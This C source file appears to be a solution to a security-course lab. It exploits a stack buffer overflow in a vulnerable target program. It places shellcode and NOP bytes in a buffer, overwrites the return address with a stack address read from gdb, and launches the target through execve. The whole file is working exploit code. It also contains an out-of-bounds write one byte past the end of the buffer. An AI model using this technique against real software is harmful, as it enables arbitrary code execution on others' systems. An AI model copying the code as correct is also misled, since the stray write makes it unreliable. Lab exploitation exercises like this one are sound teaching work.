#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target1"

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];

	/*
	(gdb) info frame
	Stack level 0, frame at 0x3021fed0:
 	 rip = 0x400bac in lab_main (target1.c:15); saved rip = 0x4009b8
	 called by frame at 0x3021ff00
 	 source language c.
 	 Arglist at 0x3021fec0, args: argc=2, argv=0x7fffffffd418
 	 Locals at 0x3021fec0, Previous frame's sp is 0x3021fed0
 	 Saved registers:
  		rbp at 0x3021fec0, rip at 0x3021fec8
	(gdb) p &buf
	 $1 = (char (*)[96]) 0x3021fe50
	*/
	char buf[124]; 
	char return_address[8]; //store the address of the buf in lab_main

	for(int i = 0; i < 120; i++){
		buf[i] = 0x90;
	}

	//fill buf with shell code
    for (int i = 0; i < 45; i++) {
        buf[i] = shellcode[i];
    }
	buf[120] = 0x50;
	buf[121] = 0xfe;
	buf[122] = 0x21;
	buf[123] = 0x30;

	// uintptr_t address_value = 0x3021fe50;
	// memcpy(return_address, &address_value, sizeof(address_value)); //copy address_value to return_address

	// memcpy(buf + 120, return_address, sizeof(return_address)); //rewrite the buf in  buf[120]
	buf[124] = '\0';


	args[0] = TARGET;
	args[1] = buf; /*put shellcode and return value here */
	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
